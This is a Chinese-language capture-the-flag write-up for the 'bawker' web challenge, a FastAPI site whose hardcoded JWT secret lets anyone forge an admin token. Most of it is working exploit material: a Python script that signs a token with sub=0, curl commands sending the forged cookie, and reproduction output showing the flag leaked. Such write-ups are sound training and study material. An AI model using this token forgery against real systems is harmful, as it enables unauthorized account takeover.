# bawker

## 题目信息

- 类型：Web
- 题目状态：已定位完整利用链，远端实例需手动创建
- 目标：`http://cdeployer1.2485370.xyz:8080/`
- 核心漏洞：硬编码 JWT 密钥导致可伪造 `admin` 身份

## 入口与现象

题目附件是一个 FastAPI 写的类 Twitter 站点。先看源码能很快锁定几个关键事实：

1. 认证 Cookie 名固定为 `bawker_token`。
2. JWT 密钥写死在源码里，是 `fake_secret_key_for_testing_purposes_only`。
3. 后端把 JWT 的 `sub` 直接当用户 ID 使用。
4. 数据库启动时会强制创建 `id=0` 的 `admin` 私密用户，并插入一条私密 bawk，内容里直接带 flag。

对应代码位置：

```python
# app/config.py
AUTH_COOKIE_NAME = "bawker_token"
JWT_SECRET_KEY = "fake_secret_key_for_testing_purposes_only"
FLAG_VALUE = "CTF{fake_flag_for_testing_purposes_only}"
```

```python
# app/security.py
payload = {"sub": subject, "exp": expire_at}
...
payload = jwt.decode(token, settings.jwt_secret_key, algorithms=[JWT_ALGORITHM])
subject = payload.get("sub")
```

```python
# app/db.py
admin = User(
    id=0,
    username="admin",
    ...
    is_private=True,
)

flag_post_content = f"Hello, the flag is: {FLAG_VALUE}"
flag_post = Bawk(
    author_id=0,
    content=flag_post_content,
    is_private=True,
)
```

这意味着只要能用已知密钥签一个 `sub=0` 的 JWT，后端就会把我们当成 `admin`。

## 分析过程

整个认证流程非常直接：

1. 登录成功后，服务端调用 `create_access_token(str(user.id))`。
2. 这个 token 被写进 `bawker_token` Cookie。
3. 后续请求里，`get_current_user_optional()` 会从 Cookie 读出 token。
4. `decode_access_token()` 只验证签名和 `exp`，然后取出 `sub`。
5. `sub` 被转成整数后直接 `session.get(User, user_id)`。

也就是说，后端没有做任何额外的服务端会话校验，也没有限制 `sub` 不能是 `0`。而 `admin` 用户恰好又是固定 `id=0`。

这题的利用链因此非常短：

1. 用源码里的固定密钥签 JWT。
2. 把 `sub` 设为 `"0"`。
3. 将生成的 token 放进 `bawker_token` Cookie。
4. 访问首页 `/`，即可看到 `admin` 的私密 bawk，也就是 flag。

## 利用过程

### 1. 生成伪造 JWT

```python
import jwt
from datetime import datetime, timedelta, timezone

token = jwt.encode(
    {
        "sub": "0",
        "exp": datetime.now(timezone.utc) + timedelta(minutes=90),
    },
    "fake_secret_key_for_testing_purposes_only",
    algorithm="HS256",
)

print(token)
```

### 2. 带上 Cookie 访问站点

如果已经拿到实际实例地址，直接把 token 放到 `bawker_token` 里访问即可：

```bash
curl -b "bawker_token=REPLACE_WITH_TOKEN" http://INSTANCE_HOST/
curl -b "bawker_token=REPLACE_WITH_TOKEN" http://INSTANCE_HOST/api/auth/me
```

`/api/auth/me` 会直接确认当前身份是不是 `admin`。

### 3. 本地复现结果

我根据附件在本地做了完整复现，结果如下：

```text
feed_anon 200 contains_flag False
register 303 set_cookie True
me_after_register 200 {'authenticated': True, 'user': {'id': 1, 'username': 'attacker', ...}}
me_admin 200 {'authenticated': True, 'user': {'id': 0, 'username': 'admin', ...}}
feed_admin 200 contains_flag True
Hello, the flag is: CTF{fake_flag_for_testing_purposes_only}
```

这说明利用链是完整可用的，不是停留在静态猜测。

## 关键 payload / 命令

```text
Cookie: bawker_token=<HS256({"sub":"0","exp":...}, "fake_secret_key_for_testing_purposes_only")>
```

生成 token：

```python
import jwt
from datetime import datetime, timedelta, timezone

print(jwt.encode(
    {"sub": "0", "exp": datetime.now(timezone.utc) + timedelta(minutes=90)},
    "fake_secret_key_for_testing_purposes_only",
    algorithm="HS256",
))
```

验证身份：

```bash
curl -b "bawker_token=REPLACE_WITH_TOKEN" http://INSTANCE_HOST/api/auth/me
```

读取首页私密 bawk：

```bash
curl -b "bawker_token=REPLACE_WITH_TOKEN" http://INSTANCE_HOST/
```

## Flag

```text
附件内占位 flag：CTF{fake_flag_for_testing_purposes_only}
```

2026-04-18 实测时，题目给出的地址实际上是一个 Challenge Instancer 首页，不是已经启动好的 `bawker` 实例，而且创建实例前需要通过 Cloudflare Turnstile。未带 Turnstile 参数直接提交会返回：

```text
Turnstile verification failed. Are you a bot?
```

所以自动化分析阶段没法直接取到远端真实 flag，但真实实例一旦创建出来，利用方式不会变化，直接把上面的 JWT 塞进 `bawker_token` 即可。

## 总结

这题本质上是一个非常直接的 JWT 伪造题：

- JWT 密钥硬编码在源码里。
- JWT 的 `sub` 被直接信任为用户 ID。
- `admin` 用户固定是 `id=0`。
- flag 就放在 `admin` 的私密 bawk 里。

因此不需要爆破密码、不需要关注私密账号关注逻辑，直接伪造 `sub=0` 的 token 就结束了。
